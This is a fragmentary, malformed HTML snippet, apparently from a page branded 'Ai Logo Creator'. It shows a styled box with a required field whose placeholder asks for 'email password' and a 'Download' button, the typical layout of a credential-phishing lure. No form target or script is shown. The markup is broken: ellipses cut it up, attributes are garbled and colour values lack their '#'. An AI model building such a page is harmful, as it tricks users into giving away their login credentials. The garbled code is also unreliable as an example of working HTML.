...
<tr><td height="">
		<div align="center">
		<b><font face="verdana" size="+2" color="#0489B1">Ai Logo Creator</font></b>
		</div>		
</td></tr>
...
<tr><td height="40%">
	...
	<table width="400" height="220" bgcolor="#E5E2E2" align="center" style="-moz-border-radius: 7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;"><tbody><tr><td>
			...
			<tbody><tr><td>
				...
				background-color: #ffffff; border: solid 2px 276BA2; padding: 10px" "="" required="" placeholder="email password">
	


				</p><p>

				<input type="submit" value="Download" logo”="" style="width:320px; height:55px; background-color: 276BA2; border: solid 3px 276BA2; 
